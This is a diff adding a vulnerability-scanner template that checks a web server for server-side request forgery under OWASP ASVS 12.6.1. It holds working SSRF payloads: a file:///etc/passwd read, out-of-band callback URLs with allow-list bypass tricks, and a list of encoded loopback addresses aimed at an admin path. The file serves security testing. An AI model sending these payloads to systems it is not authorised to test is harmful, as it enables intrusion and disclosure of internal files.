@@ -1,0 +1,117 @@
+id: ASVS-4-0-3-V12-6-1
+
+info:
+  name: ASVS 12.6.1 Check
+  author: AmirHossein Raeisi
+  severity: high  
+  classification:
+    cwe-id: CWE-918
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
+    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+    - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+  tags: asvs,12.6.1
+  description: |
+    Verify that the web or application server is configured with an allow list of resources or systems to which the server can send requests or load data/files from.
+
+variables: 
+  whiltelist_host: "http://google.com"
+  server_file: "file:///etc/passwd"
+  restricted_path: "/admin" 
+  restricted_path_keyword: "Welcom to Admin Panel"
+
+
+requests:
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"{{server_file}}"}
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+  
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"http://{{interactsh-url}}"}
+
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"{{whiltelist_host}}.{{interactsh-url}}"}
+        
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"{{whiltelist_host}}@{{interactsh-url}}"}
+
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"http://{{interactsh-url}}#{{whiltelist_host}}"}
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"http://{{localips}}/admin"}
+
+    payloads:
+      localips:
+        - '0000:0000:0000:0000:0000:ffff:127.0.0.1'
+        - '0000:0000:0000:0000:0000:ffff:7f000001'
+        - '0177.0.0.01'
+        - '0177.0.0.1'
+        - '0177.0.1'
+        - '0177.0x0.1'
+        - '0177.1'
+        - '017700000001'
+        - '0:0:0:0:0:ffff:7f000001'
+        - '0x000000007f.0x000000000.0x000000000.0x000000001'
+        - '0x7f.0.0.1'
+        - '0x7f.0.1'
+        - '0x7f.0x0.0.1'
+        - '0x7f.0x0.0x0.0x1'
+        - '0x7f.0x0.0x0.1'
+        - '0x7f.0x0.1'
+        - '0x7f.1'
+        - '0x7f000001'
+        - '127.0.0.01'
+        - '127.0.0.0x1'
+        - '127.0.0x0.0x1'
+        - '127.0x0.0x0.0x1'
+        - '2130706433'
+
+
+    stop-at-first-match: true
+    matchers:
+
+      - type: word
+        words:
+          - "{{restricted_path_keyword}}"
